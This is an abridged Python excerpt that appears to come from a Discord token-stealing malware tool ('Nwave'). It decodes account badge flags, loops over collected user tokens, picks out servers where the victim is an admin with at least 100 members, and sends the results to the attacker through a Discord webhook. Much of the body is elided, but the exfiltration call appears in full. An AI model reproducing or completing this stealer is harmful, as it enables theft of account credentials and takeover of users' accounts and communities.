...
class upload_tokens:
    ...
    def calc_flags(self, flags: int) -> list:
        flags_dict = {
            "DISCORD_EMPLOYEE": {
                "emoji": "<:staff:1092435007009738752>",
                "shift": 0,
                "ind": 1
            },
            "DISCORD_PARTNER": {
                "emoji": "<:partner:1092434998621114479>",
                "shift": 1,
                "ind": 2
            },
            "HYPESQUAD_EVENTS": {
            ...
            "BUG_HUNTER_LEVEL_1": {
                "emoji": "<:bug_hunter_1:1092435011132727368>",
                "shift": 3,
                "ind": 4
            },
            "HOUSE_BRAVERY": {
                "emoji": "<:hypersquad_1:1092435002588930118>",
                "shift": 6,
                "ind": 64
            },
            "HOUSE_BRILLIANCE": {
                "emoji": "<:hypersquad_2:1092435001192226886>",
                "shift": 7,
                "ind": 128
            },
            "HOUSE_BALANCE": {
                "emoji": "<:hypersquad_3:1092435004014989343>",
                "shift": 8,
                "ind": 256
            },
            "EARLY_SUPPORTER": {
                "emoji": "<:early_supporter:1092434994602979328>",
                "shift": 9,
                "ind": 512
            },
            "BUG_HUNTER_LEVEL_2": {
            ...
            "VERIFIED_BOT_DEVELOPER": {
                "emoji": "<:verified_dev:1092435012974022746>",
                "shift": 17,
                "ind": 131072
            },
            "ACTIVE_DEVELOPER": {
                "emoji": "<:Active_Dev:1092434996935016540>",
                "shift": 22,
                "ind": 4194304
            },
            "CERTIFIED_MODERATOR": {
                "emoji": "<:certified_moderator:1092435015171837992>",
                "shift": 18,
                "ind": 262144
            },
            "SPAMMER": {
    ...
    def upload(self):
        ...
        for token in self.tokens:
                ...
                for guild in guilds:
                    ...
                    if admin and guild['approximate_member_count'] >= 100:
                        ...
                        if len(invites) > 0:
                            ...
                            invite = "https://youtu.be/yb2jDGlVMyI"
            ...
            embed.set_footer(text="Goken#6708")

            self.webhook.send(embed=embed, username="Nwave", avatar_url="https://media.discordapp.net/attachments/1092389044811485298/1092389677283147817/Nwave.png")
